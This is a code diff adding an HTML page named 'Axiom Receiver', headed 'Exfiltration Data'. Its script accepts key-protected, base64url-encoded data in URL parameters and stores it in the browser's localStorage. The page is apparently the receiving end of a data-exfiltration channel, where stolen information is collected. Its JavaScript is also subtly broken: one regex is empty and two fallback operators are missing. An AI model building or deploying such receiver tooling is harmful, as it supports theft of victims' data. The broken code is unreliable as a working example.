@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Axiom Receiver</title>
+    <style>body{font-family:monospace;padding:20px;}pre{background:#f4f4f4;padding:15px;overflow:auto;max-height:60vh;border:1px solid #ccc;white-space:pre-wrap;}</style>
+</head>
+<body>
+    <h1>🕵️ Exfiltration Data</h1>
+    <div id="status">Waiting for data...</div>
+    <pre id="output">(No data yet)</pre>
+    <button onclick="clearData()">Clear Data</button>
+<script>
+const CONFIG = {key:'a3f9c1e7b28d4f60a5e9c3b17d8f2a4e6c1b9d3f7a2e5c8b4d1f6a9e3c7b2d5f',lsKey:'exfil_collecteddata'};
+function b64urlDecode(str){if(!str)return'';str=str.replace(/-/g,'+').replace(//g,'/');while(str.length%4!==0)str+='=';try{return decodeURIComponent(escape(window.atob(str)));}catch(e){return''}}
+window.onload=function(){const params=new URLSearchParams(window.location.search);const keyParam=params.get('k');const dataParam=params.get('n');let currentData=localStorage.getItem(CONFIG.lsKey)"";if(dataParam&&keyParam===CONFIG.key){const decoded=b64urlDecode(dataParam);if(decoded&&!currentData.includes(decoded)){currentData+=decoded;localStorage.setItem(CONFIG.lsKey,currentData);}document.getElementById('output').textContent=currentData
+"(Waiting...)";document.getElementById('status').textContent="✅ Data Received!";}}
+function clearData(){localStorage.removeItem(CONFIG.lsKey);document.getElementById('output').textContent="(No data yet)";document.getElementById('status').textContent="Cleared.";};
+</script>
+</body>
+</html>
